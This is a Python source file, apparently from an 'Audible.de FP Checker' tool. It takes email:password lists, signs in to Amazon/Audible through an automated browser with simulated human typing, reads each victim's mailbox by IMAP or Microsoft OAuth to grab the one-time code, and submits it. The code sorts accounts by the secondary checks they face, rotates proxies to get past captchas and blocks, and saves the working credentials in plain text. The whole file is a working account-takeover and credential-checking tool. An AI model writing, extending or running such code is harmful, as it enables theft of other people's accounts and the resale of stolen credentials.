            is_msft = domain in _MSFT_DOMAINS
            baseline = {} if is_msft else _imap_baseline(em, pw_)

            # ── Fill email ──
            _email_filled = False
            for sel in ['input[name="email"]', 'input[type="email"]',
                        '#ap_email', 'input[name="customerEmail"]',
                        '#forgot-username-email-input']:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible():
                        human_type(el, em)
                        _email_filled = bool(el.input_value())
                        _log(f"email filled via {sel} · value={_email_filled}")
                        break
                except Exception: pass
            if not _email_filled:
                _log("!! email field NOT filled — no selector matched")

            human_delay(0.4, 1.0)

            # ── Submit ──
            for sel in ['#continue', 'input[type="submit"]', 'button[type="submit"]',
                        'button:has-text("Weiter")']:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible(): el.click(); break
                except Exception: pass

            human_delay(2.5, 4.5)
            try:
                _boxes = page.query_selector_all('.a-alert-content, .a-box-inner, [role="alert"]')
                _errt = " | ".join(b.inner_text().strip().replace("\n"," ")[:200] for b in _boxes[:3])
                if not _errt:
                    _errt = page.inner_text("body").replace("\n"," ")[:300]
            except Exception:
                _errt = "n/a"
            _log(f"after submit · url={page.url} · alert={_errt}")
            if "nicht eindeutig identifizieren" in _errt or \
               "not uniquely identify" in _errt.lower() or \
               "we couldn't find" in _errt.lower():
                # Amazon: email tidak dikenali atau butuh verifikasi lebih.
                # OTP TIDAK akan dikirim — jangan habiskan 90s menunggu.
                result.update({"status": "fail",
                                "status_label": "fail:not_amazon"})
                browser.close(); return result
            if "ein problem ist aufgetreten" in _errt.lower() or \
               "an error occurred" in _errt.lower():
                # Generic Amazon error — but if Amazon already redirected to CVF
                # the OTP flow is still alive; only bail out when URL stayed put.
                if "cvf" not in page.url.lower():
                    result.update({"status": "fail",
                                    "status_label": "fail:amazon_error"})
                    browser.close(); return result

            cap, ctype = _detect_captcha(page)
            if cap:
                _log(f"captcha detected: {ctype}")
                result.update({"captcha": ctype, "status": "captcha",
                                "status_label": f"captcha:{ctype}"})
                browser.close(); return result

            # ── Not registered check ──
            cur_url  = page.url
            try:
                cur_html = page.content().lower()
                cur_body = page.inner_text("body").lower()
            except Exception:
                cur_html = ""; cur_body = ""

            if (any(s in cur_url.lower() for s in NOT_FOUND_URL)
                    or any(s in cur_body for s in NOT_FOUND_BODY)
                    or any(s in cur_html for s in NOT_FOUND_BODY)):
                _log(f"NOT registered · url={cur_url}")
                result.update({"status": "not_registered", "status_label": "not_registered"})
                browser.close(); return result

            # ── IMAP baseline + OTP fetch — provider-aware ──
            domain = em.split("@")[-1].lower() if "@" in em else ""
            is_msft = domain in _MSFT_DOMAINS

            if is_msft:
                # Microsoft accounts: OAuth2 inbox search (no IMAP needed)
                _log(f"msft oauth: fetching OTP via inbox search · timeout={otp_timeout}s")
                otp = _msft_oauth_wait_otp(em, pw_, proxy, timeout=otp_timeout)
            else:
                # T-Online + others: IMAP
                _log(f"waiting OTP · folders={len(_OTP_FOLDERS)} · timeout={otp_timeout}s · baseline={baseline}")
                otp = _imap_wait_otp(em, pw_, baseline, timeout=otp_timeout)
            _log(f"OTP fetch result: {otp}")
            if not otp:
                result.update({"status": "fail", "status_label": "fail:no_otp"})
                browser.close(); return result

            result["otp_email"] = otp
            human_delay(0.3, 0.8)

            # ── Fill OTP ──
            # Amazon's CVF widget comes in two shapes: a single code field, or
            # six separate one-digit boxes (each only accepts 1 char). Filling
            # the multi-box variant with el.fill() puts all digits in box 0 and
            # the code is rejected — a silent false "fail:bad_otp".
            otp_filled = False
            boxes = page.query_selector_all(
                'input[id*="cvf"][maxlength="1"], input[data-testid*="code"], '
                'input[autocomplete="one-time-code"][maxlength="1"]'
            )
            if len(boxes) >= len(otp):
                for i, ch in enumerate(otp):
                    try:
                        boxes[i].fill(ch)
                        boxes[i].dispatch_event("keydown")
                        boxes[i].dispatch_event("input")
                        boxes[i].dispatch_event("keyup")
                    except Exception: pass
                otp_filled = True
            if not otp_filled:
                for sel in ['#cvf-input-code', 'input[name="code"]', 'input[id*="cvf"]',
                            'input[autocomplete="one-time-code"]', 'input[type="text"]']:
                    try:
                        el = page.query_selector(sel)
                        if el and el.is_visible():
                            el.fill(otp)
                            el.dispatch_event("input")
                            el.dispatch_event("change")
                            el.dispatch_event("keydown")
                            el.dispatch_event("keyup")
                            otp_filled = True; break
                    except Exception: pass

            human_delay(0.3, 0.7)

            # ── Submit OTP ──
            for sel in ['input[type="submit"]', 'button[type="submit"]', '#continue',
                        'button:has-text("Weiter")']:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible(): el.click(); break
                except Exception: pass

            human_delay(3.0, 5.0)

            cap, ctype = _detect_captcha(page)
            if cap:
                result.update({"captcha": ctype, "status": "captcha",
                                "status_label": f"captcha:{ctype}"})
                browser.close(); return result

            # ── Detect secondary verification ──
            sec, label = _detect_secondary(page)
            result["secondary_verif"] = sec
            result["status_label"]    = label
            result["status"]          = "v2l" if sec == "v2l" else "detected"

        except Exception as e:
            result.update({"status": "error", "status_label": f"error:{str(e)[:60]}"})
        finally:
            try: browser.close()
            except Exception: pass

    return result


# ─────────────────────────────────────────────────────────────────────────────
# Build status string
# ─────────────────────────────────────────────────────────────────────────────
def _mask_pw(line: str) -> str:
    """Mask the password half of 'email:pw (label)' for safe stdout logging."""
    m = re.match(r"^([^:]+):(.+?)\s*\((.*)\)\s*$", line)
    if not m:
        m2 = re.match(r"^([^:]+):(.+)$", line)
        if not m2:
            return line
        pw = m2.group(2)
        return f"{m2.group(1)}:{pw[:2]}{'*' * max(0, min(len(pw) - 2, 8))}"
    pw = m.group(2)
    masked = f"{pw[:2]}{'*' * max(0, min(len(pw) - 2, 8))}"
    return f"{m.group(1)}:{masked} ({m.group(3)})"


def build_status(r: dict) -> str:
    s = r.get("status", "?")
    if s == "not_registered": return "not_registered"
    if s == "captcha":        return f"captcha:{r.get('captcha', '')}"
    if s in ("fail", "error"):
        lbl = r.get("status_label", "")
        return lbl if lbl and lbl.startswith(s + ":") else s
    if s == "v2l":     return "v2l"
    if s == "detected":
        return r.get("status_label") or r.get("secondary_verif") or "unknown"
    return s


# ─────────────────────────────────────────────────────────────────────────────
# Save helpers
# ─────────────────────────────────────────────────────────────────────────────
SKIP_VERIF   = {"otp_sms", "otp_wa", "otp_email_again", "customer_service", "unknown"}
SKIP_STATUS  = {"fail", "not_registered", "error"}
SKIP_PREFIX  = ("OTP_SMS", "OTP_WA", "OTP_EMAIL_AGAIN", "CUSTOMER_SERVICE", "UNKNOWN",
                "fail", "error", "not_registered")


def save_all(results: list, path: str, *, mask: bool = False):
    """Write results. mask=True is used for stdout logging only — the file on
    disk keeps the real password so results can be re-checked later."""
    tmpl = "{email}:{pw} ({label})"
    lines = [
        _mask_pw(tmpl.format(email=r["email"], pw=r["imap_pass"], label=build_status(r)))
        if mask else
        tmpl.format(email=r["email"], pw=r["imap_pass"], label=build_status(r))
        for r in results
    ]
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


def save_filtered(results: list, path: str) -> int:
    lines = []
    for r in results:
        label  = build_status(r)
        verif  = (r.get("secondary_verif") or "").lower()
        status = (r.get("status") or "").lower()
        if status in SKIP_STATUS: continue
        if verif  in SKIP_VERIF:  continue
        if any(label.startswith(p) for p in SKIP_PREFIX): continue
        lines.append(f"{r['email']}:{r['imap_pass']} ({label})")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    return len(lines)


# ─────────────────────────────────────────────────────────────────────────────
# Rich dashboard
# ─────────────────────────────────────────────────────────────────────────────
STATUS_COLORS = {
    "v2l": "bold green", "CC": "bold yellow", "DCQ": "bold cyan",
    "PUSH_NOTIF": "bold magenta", "OTP_SMS": "blue",
    "fail": "dim", "not_registered": "dim red",
    "captcha": "bold red", "error": "red",
}


def _color(label: str) -> str:
    for k, c in STATUS_COLORS.items():
        if label.startswith(k): return f"[{c}]{label}[/{c}]"
    return label


def build_dashboard(total: int, done: int, recent: list,
                    stats: Counter, start: float, speed: str, workers: int) -> "Panel":
    elapsed = time.time() - start
    speed_n = done / elapsed if elapsed > 0 else 0
    eta     = (total - done) / speed_n if speed_n > 0 else 0
    pct     = done / total * 100 if total else 0
    bar     = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))

    hdr = Text()
    hdr.append(f"  [{bar}] {done}/{total} ({pct:.1f}%)  ", style="bold")
    hdr.append(f"⚡ {speed_n:.1f}/s  ", style="green")
    hdr.append(f"⏱ {int(elapsed)}s  ETA:{int(eta)}s  ", style="dim")
    hdr.append(f"🧵 {workers}w  speed={speed}", style="cyan")

    st = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    st.add_column("k", min_width=22); st.add_column("v", justify="right")
    for k, v in stats.most_common(12):
        c = STATUS_COLORS.get(k.split(":")[0], "white")
        st.add_row(f"[{c}]{k}[/{c}]", f"[bold]{v}[/bold]")

    rt = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    rt.add_column("e", max_width=35, no_wrap=True, style="dim")
    rt.add_column("s", min_width=20)
    for em, lb in list(recent)[-14:]:
        rt.add_row(em, _color(lb))

    lay = Layout()
    lay.split_column(Layout(hdr, name="h", size=2), Layout(name="b"))
    lay["b"].split_row(
        Layout(Panel(st, title="[bold]Stats[/bold]", border_style="blue"), name="s"),
        Layout(Panel(rt, title="[bold]Recent[/bold]", border_style="green"), name="r"),
    )
    return Panel(lay,
                 title="[bold blue]◈ Audible.de FP Checker v2.0[/bold blue]",
                 border_style="blue", padding=(0, 1))


# ─────────────────────────────────────────────────────────────────────────────
# Batch runner
# ─────────────────────────────────────────────────────────────────────────────
def run_batch(accounts: list, speed_prof: dict,
              proxy_pool: ProxyPool | None = None,
              limit: int | None = None,
              out_dir: str = ".") -> tuple[list, int]:
    batch   = accounts[:limit] if limit else accounts
    total   = len(batch)
    results = []; stats = Counter()
    recent  = []; lock  = threading.Lock()
    done    = [0]; start = time.time()
    workers = speed_prof["workers"]
    stagger = speed_prof["stagger"]

    txt_out = os.path.join(out_dir, "results.txt")
    flt_out = os.path.join(out_dir, "results_filtered.txt")
    AUTOSAVE = 10

    def process(acc):
        try:
            return _process_one(acc)
        except Exception as exc:  # noqa: BLE001
            # never let one crash kill the run silently — count it and move on
            import traceback as _tb
            tb = _tb.format_exc()[-500:]
            print(f"  ⤷ CRASH TRACEBACK:\n{tb}", flush=True)
            with lock:
                results.append({"email": acc.get("email", "?"), "imap_pass": acc.get("imap_pass", ""),
                                "status": "fail",
                                "status_label": "error:crash", "error": str(exc)[:200],
                                "traceback": tb})
                stats["error"] += 1
                done[0] += 1
                print(f"[{done[0]:>4}/{total}] {acc.get('email','?'):<42} → error:{type(exc).__name__}", flush=True)
            return {"status": "fail", "status_label": "error:crash"}

    def _process_one(acc):
        # With a rotating-residential gateway (single endpoint, new IP per
        # connection) or a 1-entry pool, every worker can share the same proxy —
        # returning None here would fall back to the blocked datacenter IP.
        proxy = None
        if proxy_pool and proxy_pool.size > 0:
            proxy = proxy_pool.acquire()
            if proxy is None:
                proxy = proxy_pool.peek()
        r = run_account(acc, speed_prof, proxy, proxy_pool=proxy_pool)
        if not isinstance(r, dict):
            r = {"email": acc.get("email", "?"),
                 "status": "fail",
                 "status_label": "error:no_result",
                 "error": f"run_account returned {type(r).__name__}"}

        # Retry on captcha (1× with a different proxy — static ISP proxies
        # just cycle credentials, rotating exits aren't available, so one
        # attempt is all we spend; a captcha-gated account stays captcha-gated).
        if r.get("status") == "captcha" and proxy_pool and proxy_pool.size > 0:
            new_proxy = proxy_pool.force_rotate(reason="captcha")
            r2 = run_account(acc, speed_prof, new_proxy)
            if r2.get("status") != "captcha":
                r = r2

        label = build_status(r)
        key   = label.split(":")[0]

        with lock:
            results.append(r); stats[key] += 1; done[0] += 1
            recent.append((acc["email"], label))
            if len(recent) > 50: recent.pop(0)
            pct = done[0] / total * 100
            print(f"[{done[0]:>4}/{total}] ({pct:5.1f}%) {acc['email']:<42} → {label}", flush=True)
            if done[0] % AUTOSAVE == 0 or done[0] == total:
                save_all(results, txt_out)
                n = save_filtered(results, flt_out)
                print(f"  💾 Saved [{done[0]}/{total}] filtered={n}", flush=True)
        return r

    IS_TTY = sys.stdout.isatty()

    if RICH and IS_TTY:
        speed_name = speed_prof.get("label", "normal")
        with Live(console=console, refresh_per_second=2, screen=False) as live:
            with ThreadPoolExecutor(max_workers=workers) as pool:
                futures = []
                for i, acc in enumerate(batch):
                    if i > 0: time.sleep(stagger)
                    futures.append(pool.submit(process, acc))
                for f in as_completed(futures):
                    live.update(build_dashboard(total, done[0], recent, stats,
                                                start, speed_name, workers))
                live.update(build_dashboard(total, done[0], recent, stats,
                                            start, speed_name, workers))
    else:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = []
            for i, acc in enumerate(batch):
                if i > 0: time.sleep(stagger)
                futures.append(pool.submit(process, acc))
            for _ in as_completed(futures):
                pass

    save_all(results, txt_out)
    n = save_filtered(results, flt_out)
    return results, n


# ─────────────────────────────────────────────────────────────────────────────
# Interactive speed selector
# ─────────────────────────────────────────────────────────────────────────────
def interactive_speed() -> str:
    print("\n  Speed mode:\n")
    for i, (k, v) in enumerate(SPEED_PROFILES.items(), 1):
        print(f"  [{i}] {v['label']:10s}  workers={v['workers']}  {v['est']:18s}  {v['blurb']}")
    print()
    try:
        raw = input("  Pick speed [1-4] or name: ").strip()
    except EOFError:
        raw = "2"
    return normalize_speed(raw)


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print(BANNER, flush=True)
    print(f"  Version: {VERSION}", flush=True)
    print(f"  Speed  : slow | normal | fast | maximum  (--speed / interactive)", flush=True)
    print()

    parser = argparse.ArgumentParser(
        description="Audible.de FP Checker v2.0 — hardware-tier fingerprinting",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 audible_fp.py                                        # interactive
  python3 audible_fp.py --batch accounts.txt
  python3 audible_fp.py --batch accounts.txt --speed fast
  python3 audible_fp.py --batch accounts.txt --speed maximum --proxy-file proxies.txt
  python3 audible_fp.py --email u@t-online.de --imap-pass PASS

accounts.txt format (one per line):
  email@t-online.de:password

proxies.txt format:
  host:port
  host:port:user:pass
  socks5://host:port
  http://user:pass@host:port
"""
    )
    parser.add_argument("--email")
    parser.add_argument("--imap-pass")
    parser.add_argument("--batch",       help="accounts.txt")
    parser.add_argument("--limit",       type=int, help="Only process first N accounts")
    parser.add_argument("--speed", "-s", default=None, help="slow|normal|fast|maximum")
    parser.add_argument("--proxy-file",  help="proxies.txt")
    parser.add_argument("--proxy",       help="Single proxy  host:port:user:pass")
    parser.add_argument("--out-dir",     default=".", help="Output directory")
    parser.add_argument("--workers",     type=int, default=None, help="Override worker count")
    args = parser.parse_args()

    # Load accounts
    accounts = []
    if args.batch:
        with open(args.batch, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                # Strip em-dash + count suffix (e.g. " — 3")
                line = re.sub(r'\s+[—–-]\s*\d+\s*$', '', line)
                parts = line.split(":", 1)
                if len(parts) == 2:
                    accounts.append({"email": parts[0].strip(), "imap_pass": parts[1].strip()})
    elif args.email and args.imap_pass:
        accounts.append({"email": args.email, "imap_pass": args.imap_pass})
    else:
        batch_file = input("  accounts.txt path: ").strip() or "accounts.txt"
        with open(batch_file, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                line = re.sub(r'\s+[—–-]\s*\d+\s*$', '', line)
                parts = line.split(":", 1)
                if len(parts) == 2:
                    accounts.append({"email": parts[0].strip(), "imap_pass": parts[1].strip()})

    # Speed
    speed = normalize_speed(args.speed) if args.speed else interactive_speed()
    prof  = SPEED_PROFILES[speed].copy()
    if args.workers:
        prof["workers"] = args.workers

    # Proxy pool
    proxy_pool = None
    if args.proxy_file:
        proxy_pool = load_proxies(args.proxy_file)
    elif args.proxy:
        p = _parse_proxy(args.proxy)
        if p: proxy_pool = ProxyPool([args.proxy])

    os.makedirs(args.out_dir, exist_ok=True)
    total_run = args.limit or len(accounts)

    print(f"\n{'='*55}")
    print(f"  Audible.de FP Checker v{VERSION}")
    print(f"  Akun   : {total_run}/{len(accounts)}")
    print(f"  Speed  : {prof['label']} — {prof['est']}")
    print(f"  Workers: {prof['workers']}")
    print(f"  Proxy  : {proxy_pool.size if proxy_pool else 0}")
    print(f"  Output : {args.out_dir}")
    print(f"{'='*55}\n")

    results, n_filtered = run_batch(
        accounts,
        speed_prof=prof,
        proxy_pool=proxy_pool,
        limit=args.limit,
        out_dir=args.out_dir,
    )

    # Summary
    print(f"\n{'='*55}")
    print(f"  DONE — {len(results)} akun dicek")
    print(f"  results.txt          : {os.path.join(args.out_dir, 'results.txt')}")
    print(f"  results_filtered.txt : {os.path.join(args.out_dir, 'results_filtered.txt')} ({n_filtered})")
    print(f"\n  Summary:")
    stats = Counter(build_status(r).split(":")[0] for r in results)
    for k, v in stats.most_common():
        print(f"    {k:30s}: {v}")

    with open(os.path.join(args.out_dir, "results.json"), "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    main()
